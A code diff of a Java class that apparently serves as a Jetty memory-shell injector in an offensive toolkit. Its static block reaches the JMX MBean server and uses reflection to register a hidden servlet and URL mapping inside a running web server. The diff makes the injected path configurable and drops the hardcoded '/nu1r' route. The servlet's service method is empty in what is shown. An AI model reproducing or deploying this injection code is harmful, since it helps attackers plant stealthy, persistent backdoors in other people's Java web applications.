@@ -20,10 +20,11 @@ import java.util.Set;
 
 public class JSMSFromJMXS implements Servlet {
 
+    public static String pattern;
+
     static {
         try {
-            String servletName = "nu1r" + System.nanoTime();
-            String urlPattern  = "/nu1r";
+            String servletName = String.valueOf(System.nanoTime());
 
             JmxMBeanServer mBeanServer = (JmxMBeanServer) ManagementFactory.getPlatformMBeanServer();
 
@@ -104,7 +105,7 @@ public class JSMSFromJMXS implements Servlet {
                         }
 
                         servletMapping.getClass().getMethod("setServletName", String.class).invoke(servletMapping, servletName);
-                        servletMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(servletMapping, new Object[]{new String[]{urlPattern}});
+                        servletMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(servletMapping, new Object[]{new String[]{pattern}});
                         handler.getClass().getMethod("addServletMapping", clazz).invoke(handler, servletMapping);
                     }
                 } catch (Exception e) {
@@ -118,7 +119,6 @@ public class JSMSFromJMXS implements Servlet {
 
     @Override
     public void init(ServletConfig servletConfig) throws ServletException {
-
     }
 
     @Override
@@ -127,8 +127,7 @@ public class JSMSFromJMXS implements Servlet {
     }
 
     @Override
-    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
-
+    public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
     }
 
     @Override
@@ -138,6 +137,5 @@ public class JSMSFromJMXS implements Servlet {
 
     @Override
     public void destroy() {
-
     }
 }
